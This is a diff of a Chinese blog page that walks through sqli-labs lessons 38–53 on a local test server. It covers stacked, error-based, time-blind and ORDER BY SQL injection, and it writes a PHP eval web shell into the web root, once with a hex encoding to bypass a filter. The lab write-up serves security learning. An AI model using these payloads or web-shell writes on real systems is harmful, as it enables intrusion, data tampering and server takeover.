@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="less38, 比企谷八幡">
+    <meta name="keywords" content="less38-53, 比企谷八幡">
     <meta name="description" content="用我三生烟火,换你一世迷离。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>less38 | 比企谷八幡</title>
+    <title>less38-53 | 比企谷八幡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/10.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">less38</h1>
+                    <h1 class="description center-align post-title">less38-53</h1>
                 </div>
             </div>
         </div>
@@ -458,21 +458,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-25
+                    2020-11-26
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    456
+                    2.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    9 分
                 </div>
                 
 
@@ -482,26 +482,165 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="一-less38"><a href="#一-less38" class="headerlink" title="一.less38"></a>一.less38</h2><p><strong><em>堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用</em></strong></p>
-<p><strong><em>less38-xx是关于堆叠注入的学习,通关要求是找到注入点进行堆叠注入</em></strong> </p>
+                <h2 id="一-less38"><a href="#一-less38" class="headerlink" title="一.less38"></a>一.less38</h2><p><strong><em>堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用。堆叠注入的危害巨大,less45将演示利用堆叠注入写一句话木马</em></strong></p>
+<p><strong><em>less38-45是关于堆叠注入的学习,通关要求是找到注入点进行堆叠注入</em></strong> </p>
 <pre><code>#利用创建表
 http://127.0.0.1/sqli-labs/Less-38/?id=1';create table crow2 like users;--+
 
 #删除创建的表
 http://127.0.0.1/sqli-labs/Less-38/?id=1';drop table crow2;--+
 
-#往users表中插入一组数据(100,Eric,L123);--+</code></pre><p>这里我就不上图了,很容易验证</p>
+#往users表中插入一组数据(100,Eric,L123);--+</code></pre><p>这里我就不上图了,很容易验证<br>用其他的注入手段获取数据库敏感信息这里不赘述了</p>
 <h2 id="2-less39"><a href="#2-less39" class="headerlink" title="2.less39"></a>2.less39</h2><p>本关是id是数字型注入,其他的同less38</p>
 <h2 id="3-less40"><a href="#3-less40" class="headerlink" title="3.less40"></a>3.less40</h2><p>本关是id是单引号+单括号,其他的同less38</p>
 <h2 id="4-less41"><a href="#4-less41" class="headerlink" title="4.less41"></a>4.less41</h2><p>本关同less39,只是没有报错信息而已</p>
 <h2 id="5-less42"><a href="#5-less42" class="headerlink" title="5.less42"></a>5.less42</h2><p>本关是post型的注入,从login中sql语句源码我们可以知道,这里采用的是单引号闭合。由于本关源码中有对username进行mysql_real_escape_string()过滤,而passsword没有,所以可以直接在password进行注入</p>
-<pre><code> $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p>注入代码:</p>
+<pre><code> $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";</code></pre><p><a href="https://imgchr.com/i/DwZpa4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/26/DwZpa4.png" alt=""></a><br>注入代码:</p>
 <pre><code>账号:随意
 密码:a';create table test like users#</code></pre><p>页面登陆失败,但是表test会被创建(其他操作同理不赘述)</p>
 <h2 id="6-less43"><a href="#6-less43" class="headerlink" title="6.less43"></a>6.less43</h2><p>本关passwood是用单引号+单括号闭合的,其他的同less42</p>
 <h2 id="7-less44"><a href="#7-less44" class="headerlink" title="7.less44"></a>7.less44</h2><p>本关是基于盲注的,除了没有报错信息外其他的同42<br>按照流程来一遍把数据库名,表名,字段名都猜解出来</p>
-<h2 id="8-less45"><a href="#8-less45" class="headerlink" title="8.less45"></a>8.less45</h2><p>45关与43关的payload是一样的，只不过45关依旧没有报错信息(代码直接抄过来用)<br>union select  updatexml(0x3e,concat(1,database(),1),1)#</p>
-<h2 id="9-less46"><a href="#9-less46" class="headerlink" title="9.less46"></a>9.less46</h2><script>
+<p><strong>注意:猜解的时候一定要用or,因为如果用and的话,在账号密码已经是错误的情况下或者未知的情况下,执行到第一个错误的分句后就不再执行,用or的话会都执行一遍,这样就可以用延时注入来猜解数据库的相关信息</strong></p>
+<pre><code>' or if(left(database(),1)=100,1,sleep(5));#</code></pre><p>其他同理,不作赘述</p>
+<h2 id="8-less45"><a href="#8-less45" class="headerlink" title="8.less45"></a>8.less45</h2><p>45关与43关的payload是一样的，只不过45关依旧没有报错信息(代码直接抄过来用),依旧用盲注</p>
+<p><strong>用堆叠注入来写一句话木马(以上关卡也都能用,只是在less45展示而已)</strong><br>条件:  </p>
+<ul>
+<li>root 写权限</li>
+<li>一句话木马</li>
+<li>select xxx into outfile xxx</li>
+<li>写入点<pre><code>#一句话木马
+&lt;?php @eval($_POST["root"]); ?&gt;</code></pre></li>
+</ul>
+<p>注入代码</p>
+<pre><code>a'); select '&lt;?php @eval($_POST["root"]); ?&gt;' into outfile 'E:\\phpstudy\\PHPTutorial\\WWW\\crow1.php';#</code></pre><p>虽然网页显示登陆失败但是一句话木马已经注入成功,然后用中国菜刀获得更高权限进行入侵<br><a href="https://imgchr.com/i/DdPBLj" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/25/DdPBLj.png" alt=""></a></p>
+<h2 id="九-总结-less38-45"><a href="#九-总结-less38-45" class="headerlink" title="九.总结(less38-45)"></a>九.总结(less38-45)</h2><p>堆叠注入就是利用分号结束当前sql语句,然后再自己按照需求任意添加别的sql语句实现注入效果</p>
+<p><strong>堆叠注入对网站和服务器的危害相当之大,当爆破出库名表名后,进行各种增删改查,或者是随意往数据库里创建表或者加入本不存在的信息,再或者对服务器进行木马注入,都会对网站造成难以估量的损失</strong></p>
+<h2 id="十-less46"><a href="#十-less46" class="headerlink" title="十.less46"></a>十.less46</h2><p>从本关开始，我们开始学习order by相关注入的知识</p>
+<p>补充知识:</p>
+<ul>
+<li>1.?sort=1 表示select xx from xx order by 1</li>
+<li>select * from users into outfile ‘绝对路径’ lines terminated by xxx(xxx可以用十六进制表示,别忘了前面手动加0x)：这句sql语句表示将东西写入文件以xxx分隔</li>
+</ul>
+<p>下面开始这关的内容:  </p>
+<p>首先本关是提示信息要求使用sort,我们输入在网址后面补?sort=1,如下,可以得到一张表,我在源码中打印了sql语句,从sql语句中可知，这里sort控制的是order by 后面的值(本关开始考点就是order by相关注入)</p>
+<p>闭合方式:整型<br><a href="https://imgchr.com/i/DdLgaD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/26/DdLgaD.png" alt=""></a></p>
+<p>注入方法((报错注入和延时注入前面已经讲过很多次了,详见less5的报错注入处)):</p>
+<ul>
+<li>1.报错注入<pre><code>select updatexml(1,concat(0x7e,要查询的sql语句),1)
+</code></pre></li>
+</ul>
+<p>#如查询数据库名<br><a href="http://127.0.0.1/sqli-labs/Less-46/?sort=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-46/?sort=1</a> and updatexml(1,concat(0x7e,database(),1),1)–+</p>
+<pre><code>
+* 2.延时注入</code></pre><p>select if((length(database()))&gt;8,1,sleep(5))</p>
+<p>#如果数据库名长度&gt;8就sleep5s<br><a href="http://127.0.0.1/sqli-labs/Less-46/?sort=1" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-46/?sort=1</a> and if((length(database()))&gt;8,1,sleep(5))</p>
+<pre><code>
+总结:利用以上两种手段,在 order by 后面加 and 报错注入代码 来爆数据库的的数据
+
+## 十一.less47
+本关闭合order by处是单引号闭合,像前面id一样构造闭合即可,其他的相同
+
+以延时注入为例:</code></pre><p><a href="http://127.0.0.1/sqli-labs/Less-47/?sort=1'and" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-47/?sort=1'and</a> if((length(database()))&gt;6,1,sleep(5)) –+</p>
+<pre><code>
+## 十二.less48
+本关是order by处是整型,但通过单引号测试可知本关没有报错信息,所以选择时间盲注来获取信息,其他的同less46,具体过程略
+
+## 十三.less49
+本关是order by处是单引号闭合,无报错信息,其他同less47,依旧选择时间盲注来获取信息,具体过程略
+
+
+**下面尝试使用写入文件的方式破解less49**</code></pre><p>#语法(line后面的部分可选,下面就会出现非用不可的情况)<br>select * from users into outfile ‘绝对路径’ lines terminated by xxx</p>
+<pre><code></code></pre><p><a href="http://127.0.0.1/sqli-labs/Less-49/?sort=1'" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-49/?sort=1'</a><br> into outfile “E:\phpstudy\PHPTutorial\WWW\less49.txt” –+</p>
+<pre><code>
+虽然有警告,但是已经成功通过注入把users表的内容写到文件中(因为前面已经有select并且我们需要的就是前面select出来的数据,所以这里千万不要再加select 和and)
+[![](https://s3.ax1x.com/2020/11/26/DdXOvn.png)](https://imgchr.com/i/DdXOvn)
+
+
+&lt;/br&gt;
+下面演示通过写入文件来注入的方式
+
+**插入一句话木马**
+
+注入代码如下</code></pre><p><a href="http://127.0.0.1/sqli-labs/Less-49/?sort=1'" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-49/?sort=1'</a> and<br> (select ‘<!--?php @eval($_POST["root"]); ?-->‘) into outfile ‘E:\phpstudy\PHPTutorial\WWW\crow3.php’–+</p>
+<pre><code>
+
+**注:这里select外面一定要加一层括号,这样才表示把这句话写入文件**
+
+[![](https://s3.ax1x.com/2020/11/26/DwC61S.png)](https://imgchr.com/i/DwC61S)
+
+成功写入文件,但是打开文件后会发现只有写入了and前面那句sql语句的内容,一句话木马并不存在。我们通过手动输出的sql语句中也能看到,这里一句话木马被过滤掉了
+
+**奇怪的是,这里我把一句话木马换成随便的一个字符串比如1234,再在显示的sql语句中虽然正常显示了我要加的句子,但是文本中依旧不显示**
+
+[![](https://s3.ax1x.com/2020/11/26/DwCQT1.png)](https://imgchr.com/i/DwCQT1)
+
+**解决方法:利用lines terminated by来实现插入,这里by后面是可以用字符的十六进制形式来进行注入的,这样就能实现绕过过滤**
+
+
+进制转换的网站：https://www.bejson.com/convert/ox2str/
+
+将&lt;?php @eval($_POST["root"]);转换成十六进制写再lines terminated by 的后面即可  
+下面是注入代码 </code></pre><p><a href="http://127.0.0.1/sqli-labs/Less-49/?sort=1'" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-49/?sort=1'</a><br> into outfile “E:\phpstudy\PHPTutorial\WWW\less49_02.php” lines terminated by 0x3c3f706870406576616c28245f504f53545b22726f6f74225d293b3f3e –+</p>
+<pre><code>[![注入成功](https://s3.ax1x.com/2020/11/26/DwPxbj.png)](https://imgchr.com/i/DwPxbj)
+
+由上图可知,确实注入成功
+
+## 十四.less50
+从本关开始我们开始进行 order by stacked injection
+前面的关卡中,源码中使用的是mysqli _query()的方式执行sql语句,而本关开始使用的是mysqli_multi_query()
+
+**mysqli _query())和mysqli_multi_query()的区别**
+
+* mysqli _query():只能执行一句sql语句
+* mysqli_multi_query():可以执行多句sql语句
+
+
+接下来从less50-53是对上面两大关(堆叠注入和order by注入)的结合,手法如下按照实际情况选(不再一一演示)  
+* 1.延时盲注
+* 2.报错注入
+* 3.直接写一句话木马(见less49)
+* 4.用堆叠注入写一句话木马(见less45)  
+* 5.用堆叠注入实现创表删表等操作(见less38)
+
+本关是整型闭合,操作就不演示了
+
+## 十五.less51
+本关是单引号闭合,其他同less50,不赘述
+
+## 十六.less52
+本关是整型闭合没有报错信息,其他同less50(无报错信息的题不可用报错注入)
+
+## 十七.less53
+本关是单引号闭合,无报错信息,同less51
+
+
+
+## 十.总结(less46-53)
+对比:
+
+?id=n  ---&gt;   select xx from xx where id = n  
+?sort=n ---&gt;  select xx from xx order by n  
+
+二者基本同理,注入的步骤都是:
+* 引号测试是否存在报错以及确定闭合类型
+* 没有报错信息就选择时间盲注,有的话就报错注入和时间盲注都可以
+。如果有别的可行的方法也行
+* 根据需求选择合适的注入手法进行信息获取或攻击
+
+
+
+less38-53手法汇总:
+* 1.延时盲注
+* 2.报错注入
+* 3.直接写一句话木马(见less49)
+* 4.用堆叠注入写一句话木马(见less45)  
+* 5.用堆叠注入实现创表删表等操作(见less38)
+
+
+
+**注 : 可能还存在一些别的方式可以注入通关,这里主要讨论时间盲注和报错注入和用写入文件的方式来注入**
+
+
+</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -665,18 +804,16 @@ http://127.0.0.1/sqli-labs/Less-38/?id=1';drop table crow2;--+
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="less38">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="less38-53">
                         
-                        <span class="card-title">less38</span>
+                        <span class="card-title">less38-53</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            一.less38堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用
-less38-xx是关于堆叠注入的学习,通关要求是找到注入点进行堆叠注入 
-#利用创建表
-http://127.0.0.1/sqli
+                            一.less38堆叠注入:就是利用利用分号来分隔一个sql语句,然后在同一行再写一个sql语句实现多句并用。堆叠注入的危害巨大,less45将演示利用堆叠注入写一句话木马
+less38-45是关于堆叠注入的学习,通关要求是找到注入点进行堆叠
                         
                     </div>
                     <div class="publish-info">
@@ -714,27 +851,26 @@ http://127.0.0.1/sqli
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/11/22/less1-dao-less22-zong-jie/">
+                <a href="/2020/11/21/less23/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="less1到less22总结">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="less23-37">
                         
-                        <span class="card-title">less1到less22总结</span>
+                        <span class="card-title">less23-37</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            网址加密解密网站http://www.guabu.com/tools/wyjm.htm
-
-        document.querySelectorAll('.github-emoji')
-          .forEach(el =>
+                            一.less23本关不能用–+来进行输出,源码中自动换成空格了
+通过单引号测试获得的报错信息得知是单引号闭合猜测原sql语句
+select id,username,password from users where id='xx'方法一:特
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-21
                             </span>
                         <span class="publish-author">
                             
@@ -743,6 +879,18 @@ http://127.0.0.1/sqli
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-labs/">
+                        <span class="chip bg-color">sqli-labs</span>
+                    </a>
+                    
+                    <a href="/tags/SQL%E6%B3%A8%E5%85%A5/">
+                        <span class="chip bg-color">SQL注入</span>
+                    </a>
+                    
                 </div>
                 
             </div>
